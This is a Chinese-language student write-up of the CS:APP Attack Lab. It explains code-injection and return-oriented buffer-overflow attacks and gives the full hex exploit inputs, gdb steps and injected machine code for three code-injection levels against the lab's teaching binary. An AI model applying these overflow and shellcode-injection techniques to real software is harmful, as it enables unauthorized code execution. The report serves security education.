# Attack Lab

## 实验目的

理解缓冲区溢出攻击的种类和原理，掌握实施攻击的简单技术，更加深入理解汇编代码和机器码的关系、运行栈的原理等。

## 实验原理

缓冲区溢出攻击有两种：代码注入和使用返回指令进行攻击。

### 代码注入

代码注入的原理为，在运行栈上原本的 return address 上填充目标指令的地址，使得函数执行 `ret` 时跳转到目标代码。目标指令可以是现有的指令，也可以是栈上通过缓冲区填充的二进制指令。后者只能在关闭了只读保护的前提下进行，而且因为需要将指令地址硬编码进入缓冲区，所以需要栈地址固定。

最简单的情况是，不需要执行自定义指令，直接跳转到一个已有的指令。此时，只需要使用字符将缓冲区填满，再将此指令的地址填入 return address 即可：

```text
+----------------------------+
addr of instruction             <--- %rsp
+----------------------------+

padding (size of buffer)

+----------------------------+
```

如果需要执行自定义的指令，情况稍微复杂一点。首先，return address 应该填充第一条自定义指令在栈上的地址，而这条自定义指令的地址只能在运行期确定。幸运的是，如果栈地址是固定的，那么可以通过运行一次程序，使用 debugger 确定栈的地址，并将其填充入 return address。这样，返回时就会跳转到第一条自定义指令，并且顺序执行之后的指令。

一种构造的运行栈如下：

在原来 return address 的高 8 位，填充在执行完自定义指令后跳转的现有指令的地址，并将最后一条自定义指令设置为 `ret`。这样，就可以在执行完自定义指令后，跳转到需要执行的现有指令。

利用一种方法构造的运行栈如下。其中的指令长度不一定为 8，需要紧密排列在一起。额外的 padding 与指令的总大小为缓冲区的总大小。

```text
+----------------------------+
addr of existing instruction     <--- %rsp after 'ret'
+----------------------------+
addr of instruction 1            <--- %rsp
+----------------------------+   -------+
instruction 1                           |
+----------------------------+          |
instruction 2                           |
..............................          |
instruction n                           |
+----------------------------+          | size of buffer
ret                                     |
+----------------------------+          |
                                        |
padding                                 |
                                        |
+----------------------------+   -------+
```

当然，自定义指令的位置可以灵活放置，不过原理都是类似的。

### 利用返回指令

在开启了栈保护的程序中，栈的地址不能静态地确定，而且栈上的指令无法执行，只能通过执行已有指令进行攻击。

这种攻击的基本思路是，在缓冲区上方填充若干个 gadget 的地址，每一个 gadget 都是现有的指令，并以 `c3`，即 `ret` 的机器码结尾。这样，在执行完 gadget 的指令后，栈指针都会指向下一个 gadget 的地址，由此可以连续执行所有 gadget 的指令。

```text
+----------------------------+
addr of dest instruction        <--- %rsp after gadget n
+----------------------------+
addr of gadget n                <--- %rsp after gadget n-1
.............................. 
addr of gadget 2                <--- %rsp after gadget 1
+----------------------------+
addr of gadget 1                <--- %rsp
+----------------------------+

padding

+----------------------------+
```

## 实验过程

首先，通过反汇编获取缓冲区的大小。根据 `getbuf` 的汇编代码：

```text
0000000000401804 <getbuf>:
  401804:	48 83 ec 38          	sub    $0x38,%rsp
  401808:	48 89 e7             	mov    %rsp,%rdi
  40180b:	e8 94 02 00 00       	callq  401aa4 <Gets>
  401810:	b8 01 00 00 00       	mov    $0x1,%eax
  401815:	48 83 c4 38          	add    $0x38,%rsp
  401819:	c3                   	retq   
```

我们可以知道，在栈上开辟了 `0x38` 大小的空间，这就是我们需要的缓冲区大小。

### CI - Level 1

这个部分要求跳转到函数 `touch1`。通过反汇编，得到 `touch1` 的地址：

```text
000000000040181a <touch1>:
```

地址为 `0x40181a`。于是，构造以下的输入：

```text
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32
1a 18 40 00 00 00 00 00
```

其中 56 个字节为 padding，将 `0x40181a` 根据小端字节序填充即可。

运行栈情形如下：

```text
+----------------------------+
addr of touch1                 <--- %rsp
+----------------------------+

padding

+----------------------------+
```

### CI - Level 2

这个部分要求跳转到函数 `touch2`，并且需要传递 Cookie 作为参数。我们需要执行自定义的指令，使得 `%rdi` 中的内容为我们的 Cookie。

#### 获得指令机器码

自定义指令如下：

```assembly
movq $0x283db5ea, %rdi
ret
```

使用 `gcc -c`，得到对应的机器码：

```text
0:	48 c7 c7 ea b5 3d 28 	mov    $0x283db5ea,%rdi
7:	c3                   	retq   
```

#### 获取运行栈的地址

然后，通过 `gdb` 获取运行栈的地址。在 `getbuf` 的 `ret` 指令处设置断点：

```text
(gdb) b *0x401819
```

在断点处打印 `%rsp` 的值：

```text
Breakpoint 1, 0x0000000000401819 in getbuf () at buf.c:16
(gdb) p $rsp
$1 = (void *) 0x556563b0
```

可以得到，当前栈指针指向的地址为 `0x556563b0`。

#### 填充

使用[实验原理](#实验原理)中的方法，将机器码，以及 `touch2` 的地址填充：

```text
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32
00 00 00 00 00 00 00 00 00 00 00 00
48 c7 c7 ea b5 3d 28    /* movq $0x283db5ea, %rdi */
c3                      /* ret */
a8 63 65 55 00 00 00 00 /* addr of 'movq $0x283db5ea, %rdi' */
48 18 40 00 00 00 00 00 /* addr of touch2 */
```

即可在跳转至 `touch2` 之前，将 Cookie 写入 `%rdi`。

运行栈情形如下：

```text
+------------------------------+
addr of touch2                   <--- %rsp after 'ret'
+------------------------------+
addr of 'movq $0x283db5ea, %rdi' <--- %rsp
+------------------------------+
ret | movq $0x283db5ea, %rdi
+------------------------------+
padding
...
+------------------------------+
```

### CI: Level 3

这个部分要求跳转到函数 `touch3`，并且需要传递 Cookie 字符串的地址作为参数。由于是传地址，我们需要将 Cookie 字符串填充在栈上，并获取栈上此字符串的地址。

我们利用与上一个题目类似的思路将自定义指令填充进缓冲区中。由于 `touch3` 中会开辟栈空间，将字符串填充至最低位置，并注意加上 `\0` 作为结尾，然后将字符串的地址（通过栈指针指向的地址和与其的偏移量确定）写入 `%rdi` 中：

```text
32 38 33 64 62 35 65 61 00    /* string */
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32 32 32 32
32 32 32 32 32 32 32
00 00 00 00 00 00 00 00 00 00 00 00
48 c7 c7 78 63 65 55    /* movq $0x55656378 (addr of string), %rdi */
c3                      /* ret */
a8 63 65 55 00 00 00 00 /* addr of 'movq $0x55656378, %rdi' */
5f 19 40 00 00 00 00 00 /* addr of touch3 */
```

运行栈情形如下：

```text
+-----------------------------+
addr of touch3                  <--- %rsp after 'ret'
+-----------------------------+
addr of 'movq $283db5ea, %rdi'  <--- %rsp
+-----------------------------+
ret | movq $283db5ea, %rdi
+-----------------------------+
padding
...
32 38 33 64 62 35 65 61 00 ...
+-----------------------------+
```